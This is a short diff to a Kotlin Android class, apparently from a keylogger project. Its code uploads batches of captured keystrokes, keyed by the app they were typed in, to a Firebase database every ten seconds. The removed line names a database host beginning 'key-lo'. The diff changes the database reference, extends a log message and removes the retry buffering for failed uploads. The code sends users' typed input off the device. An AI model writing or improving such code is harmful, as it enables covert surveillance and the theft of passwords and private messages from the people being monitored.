@@ -18,7 +18,7 @@ class FirebaseSyncManager {
         private var lastAppName = "unknown.app"
 
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance("https://key-lo-5811c-default-rtdb.firebaseio.com").getReference("keystrokes_batches")
+            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -73,13 +73,10 @@ class FirebaseSyncManager {
 
                 ref.child(sanitizedAppName).child(timestampKey).setValue(logData)
                     .addOnSuccessListener {
-                        Log.d(TAG, "Successfully synced 10-sec batch of logs to Firebase")
+                        Log.d(TAG, "Successfully synced 10-sec batch of logs to Firebase: $sanitizedAppName")
                     }
                     .addOnFailureListener { e ->
-                        Log.e(TAG, "Failed to sync batch to Firebase", e)
-                        synchronized(buffer) {
-                            buffer.insert(0, content)
-                        }
+                        Log.e(TAG, "FAILED to sync batch to Firebase!", e)
                     }
 
             } catch (e: Exception) {
